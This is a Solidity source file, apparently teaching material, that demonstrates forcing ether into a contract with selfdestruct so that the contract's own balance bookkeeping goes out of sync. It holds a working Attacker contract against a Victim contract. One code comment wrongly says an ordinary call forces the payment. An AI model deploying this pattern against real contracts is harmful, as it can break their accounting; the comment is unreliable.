// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

/// @title SelfDestructAttacker
/// @notice Demonstrates forced ether payment via selfdestruct
/// @dev Educational example - DO NOT USE IN PRODUCTION

/// @title Victim Contract that accepts ether
contract Victim {
    address public owner;
    uint256 public balance;
    
    constructor() {
        owner = msg.sender;
    }
    
    receive() external payable {
        balance += msg.value;
    }
    
    function withdraw() external {
        require(msg.sender == owner);
        payable(owner).transfer(balance);
        balance = 0;
    }
}

/// @title Attacker Contract using selfdestruct
contract Attacker {
    Victim public victim;
    
    constructor(address _victim) {
        victim = Victim(payable(_victim));
    }
    
    /// @notice Attack - send ether via selfdestruct
    function attack() external payable {
        require(msg.value > 0);
        // Force send ether to victim via selfdestruct
        address(victim).call{value: msg.value}("");
    }
    
    /// @notice Selfdestruct and send all ether to victim
    function selfDestructAttack() external {
        selfdestruct(payable(address(victim)));
    }
    
    receive() external payable {}
}
